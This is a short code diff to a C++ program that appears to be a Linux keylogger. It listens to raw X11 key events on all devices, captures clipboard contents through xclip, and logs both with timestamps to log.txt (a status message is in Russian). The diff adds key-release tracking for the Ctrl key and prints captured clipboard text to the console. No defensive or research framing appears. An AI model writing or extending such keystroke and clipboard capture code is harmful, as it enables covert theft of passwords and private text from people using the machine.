@@ -85,6 +85,7 @@ int main() {
     XIEventMask evmask;
     unsigned char mask_bytes[XI_LASTEVENT] = {0}; 
     XISetMask(mask_bytes, XI_RawKeyPress);
+    XISetMask(mask_bytes, XI_RawKeyRelease);
     
     evmask.deviceid = XIAllMasterDevices; 
     evmask.mask_len = sizeof(mask_bytes);
@@ -126,6 +127,7 @@ int main() {
 
                 if (result.should_grabBuffer) {
                     std::string clipboard_text = exec("xclip -selection clipboard -o");
+                    std::cout<<"Copied: " << clipboard_text<< std::endl;
                     log_buffer += "\n\n" + getCurrentTimestamp() + " - Copied:[\n" + clipboard_text + "\n]\n";
                     continue;
                 }
@@ -155,6 +157,16 @@ int main() {
                     }
                 }
             }
+
+            if (xevent.xcookie.evtype == XI_RawKeyRelease) {
+                XIRawEvent* rawev = (XIRawEvent*)xevent.xcookie.data;
+                KeySym keysym = XkbKeycodeToKeysym(display, rawev->detail, 0, 0);
+
+                
+                if (keysym == XK_Control_L) {
+                    ctrlPressed = false;
+                }
+            }
             
             XFreeEventData(display, &xevent.xcookie);
         }
@@ -166,5 +178,4 @@ int main() {
     std::cout << "Лог записан в log.txt" << std::endl;
     
     XCloseDisplay(display);
-    return 0;
 }
